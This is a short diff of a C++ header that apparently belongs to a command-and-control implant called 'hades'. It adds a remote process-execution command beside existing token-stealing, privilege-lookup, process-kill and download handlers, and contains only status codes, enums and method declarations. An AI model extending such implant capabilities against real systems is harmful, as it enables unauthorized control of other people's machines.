@@ -2,8 +2,6 @@
 #include "../hades/hades.h"
 
 
-// todo fix these, right now calling g_ByteMgr->EndErr(*_SUCCESS), confusing when read, check do_rm() for example
-// update g_ByteMgr->EndOK() to take a status, server checks if > 1, if so lookup in StatusCodeMap to get success string
 #define CP_SUCCESS    488
 #define CD_SUCCESS    489 
 #define RM_SUCCESS	  490
@@ -14,6 +12,7 @@
 #define RECONFIG_DONE 495
 #define KILL_SUCCESS 496
 #define STEAL_SUCCESS 497
+#define PROCESS_CREATE_SUCCESS 498
 
 #define TASK_TYPE_GETPRIVS 3
 #define TASK_TYPE_LS 4
@@ -34,7 +33,6 @@
 #define ERROR_LOOKUPPRIV_FAILED 553
 #define ERROR_PS_LIST 554
 
-#define COL_WIDTH 35
 
 class commanders {
 	enum CMD_ACTION_CODES {
@@ -55,6 +53,7 @@ class commanders {
 		CMD_CODE_RECONFIG,
 		CMD_CODE_PROC_KILL,
 		CMD_CODE_STEAL_TOKEN,
+		CMD_CODE_EXEC,
 	};
 
 	enum PrivStatus : UINT32 {
@@ -87,6 +86,7 @@ class commanders {
 	void do_download();
 	void do_reconfig();
 	void do_steal_token();
+	void do_exec();
 
 
 public:
